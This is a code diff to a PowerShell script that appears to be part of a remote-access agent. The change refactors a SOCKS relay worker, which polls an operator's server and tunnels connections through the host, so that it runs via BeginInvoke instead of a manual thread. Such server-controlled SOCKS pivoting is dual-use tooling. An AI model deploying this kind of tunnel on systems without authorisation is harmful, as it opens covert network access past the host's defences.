@@ -90,7 +90,7 @@ $script:RmmSocksWorker = @{
     Running    = $false
     Runspace   = $null
     PowerShell = $null
-    Thread     = $null
+    Async      = $null
 }
 $script:RmmSocksLogQueue = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
 
@@ -929,33 +929,6 @@ function Start-RmmSocksChannelWorker {
         RmmSocksLogQueue               = $script:RmmSocksLogQueue
     }
 
-    $workerScript = @'
-while (-not $RmmSocksChannelStop) {
-    try {
-        $headers = Get-RmmRequestHeaders
-        $pollUrl = "$u/socks?id=$sessionId"
-        $poll = Invoke-RmmRestMethod -Uri $pollUrl -Method Get -Headers $headers -RestErrorAction SilentlyContinue
-        if (-not (Get-RmmSocksPollActive -Poll $poll)) {
-            Write-RmmSocksHostLine '[*] SOCKS relay stopped on server'
-            break
-        }
-        if (-not $script:RmmSocksChannelWasActive) {
-            Write-RmmSocksHostLine '[+] SOCKS channel active (/socks only)'
-            $script:RmmSocksChannelWasActive = $true
-        }
-        $null = Invoke-RmmSocksCycle -Headers $headers -Poll $poll
-        Start-Sleep -Milliseconds 80
-    } catch {
-        Write-RmmSocksHostLine "[!] SOCKS channel error: $($_.Exception.Message)"
-        Start-Sleep -Milliseconds 400
-    }
-}
-foreach ($id in @($script:RmmSocksConnections.Keys)) {
-    try { $script:RmmSocksConnections[$id].Close() } catch { }
-}
-Write-RmmSocksHostLine '[*] SOCKS channel worker stopped'
-'@
-
     $ps = [PowerShell]::Create()
     $ps.Runspace = $socksRs
     [void]$ps.AddScript({
@@ -967,46 +940,45 @@ Write-RmmSocksHostLine '[*] SOCKS channel worker stopped'
         $script:RmmSocksConnections = @{}
         $script:RmmSocksChannelWasActive = $false
         $script:RmmSocksLogQueue = $LogQueue
-    }).AddArgument([bool]$script:RmmVerbose).AddArgument($socksCookie).AddArgument($script:RmmWebProxy).AddArgument($script:RmmSocksLogQueue)
-    $initOut = $ps.Invoke()
-    Restore-RmmHostRunspace
-    if ($ps.Streams.Error.Count -gt 0) {
-        $errs = ($ps.Streams.Error | ForEach-Object { $_.Exception.Message }) -join '; '
-        $ps.Streams.Error.Clear()
-        $ps.Dispose()
-        $socksRs.Close()
-        Write-Host "[-] SOCKS channel init failed: $errs" -ForegroundColor Red
-        return
-    }
-    $ps.Commands.Clear()
-    [void]$ps.AddScript($workerScript)
-
-    $workerThread = New-Object System.Threading.Thread -ArgumentList ([System.Threading.ParameterizedThreadStart]{
-        param($state)
-        $workerPs = $state.PowerShell
-        $workerRs = $state.Runspace
-        $previousDefault = [runspace]::DefaultRunspace
-        try {
-            [runspace]::DefaultRunspace = $workerRs
-            $null = $workerPs.Invoke()
-        } finally {
-            [runspace]::DefaultRunspace = $previousDefault
+        while (-not $RmmSocksChannelStop) {
+            try {
+                $headers = Get-RmmRequestHeaders
+                $pollUrl = "$u/socks?id=$sessionId"
+                $poll = Invoke-RmmRestMethod -Uri $pollUrl -Method Get -Headers $headers -RestErrorAction SilentlyContinue
+                if (-not (Get-RmmSocksPollActive -Poll $poll)) {
+                    Write-RmmSocksHostLine '[*] SOCKS relay stopped on server'
+                    break
+                }
+                if (-not $script:RmmSocksChannelWasActive) {
+                    Write-RmmSocksHostLine '[+] SOCKS channel active (/socks only)'
+                    $script:RmmSocksChannelWasActive = $true
+                }
+                $null = Invoke-RmmSocksCycle -Headers $headers -Poll $poll
+                Start-Sleep -Milliseconds 80
+            } catch {
+                Write-RmmSocksHostLine "[!] SOCKS channel error: $($_.Exception.Message)"
+                Start-Sleep -Milliseconds 400
+            }
         }
-    })
-    $workerThread.IsBackground = $true
+        foreach ($id in @($script:RmmSocksConnections.Keys)) {
+            try { $script:RmmSocksConnections[$id].Close() } catch { }
+        }
+        Write-RmmSocksHostLine '[*] SOCKS channel worker stopped'
+    }).AddArgument([bool]$script:RmmVerbose).AddArgument($socksCookie).AddArgument($script:RmmWebProxy).AddArgument($script:RmmSocksLogQueue)
     try {
-        $workerThread.Start(@{ PowerShell = $ps; Runspace = $socksRs })
+        $async = $ps.BeginInvoke()
     } catch {
         Write-Host "[-] SOCKS channel worker failed to start: $($_.Exception.Message)" -ForegroundColor Red
         $ps.Dispose()
         $socksRs.Close()
         return
     }
+    Restore-RmmHostRunspace
 
     $script:RmmSocksWorker.Running = $true
     $script:RmmSocksWorker.Runspace = $socksRs
     $script:RmmSocksWorker.PowerShell = $ps
-    $script:RmmSocksWorker.Thread = $workerThread
+    $script:RmmSocksWorker.Async = $async
     Write-Host "[*] SOCKS channel started (operator ran socks; logs below)" -ForegroundColor Cyan
     Drain-RmmSocksHostLog
     Restore-RmmHostRunspace
@@ -1019,20 +991,15 @@ function Stop-RmmSocksChannelWorker {
     if ($rs) {
         try { $rs.SessionStateProxy.SetVariable('RmmSocksChannelStop', $true) } catch { }
     }
-    $th = $script:RmmSocksWorker.Thread
-    if ($th -and $th.IsAlive) {
-        try {
-            if (-not $th.Join(15000)) {
-                Write-Host "[!] SOCKS channel thread did not stop within 15s" -ForegroundColor Yellow
-            }
-        } catch { }
+    if ($ps -and $script:RmmSocksWorker.Async) {
+        try { $ps.EndInvoke($script:RmmSocksWorker.Async) } catch { }
     }
     if ($ps) { $ps.Dispose() }
     if ($rs) { $rs.Close() }
     $script:RmmSocksWorker.Running = $false
     $script:RmmSocksWorker.Runspace = $null
     $script:RmmSocksWorker.PowerShell = $null
-    $script:RmmSocksWorker.Thread = $null
+    $script:RmmSocksWorker.Async = $null
     Drain-RmmSocksHostLog
     Write-Host "[*] SOCKS channel stopped" -ForegroundColor Yellow
     Restore-RmmHostRunspace
